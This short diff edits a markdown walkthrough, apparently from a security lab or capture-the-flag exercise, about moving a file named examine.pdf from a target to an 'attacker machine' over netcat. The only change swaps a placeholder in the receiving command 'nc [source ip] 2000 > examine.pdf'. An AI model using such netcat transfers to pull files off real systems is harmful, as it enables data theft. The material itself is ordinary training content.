@@ -22,7 +22,7 @@ The first step would be to create a netcat session that will listen and transmit
 
 On the attacker machine, we then setup another netcat session to accept the file. As seen below the file has been accepted and now sits in the current working directory on the attack machine.
 
-``` nc [ip] 2000 > examine.pdf ```
+``` nc [source ip] 2000 > examine.pdf ```
 
 ![image](https://user-images.githubusercontent.com/66912443/186408034-6b45036a-256c-4826-ae39-d9091caa1db9.png)
 
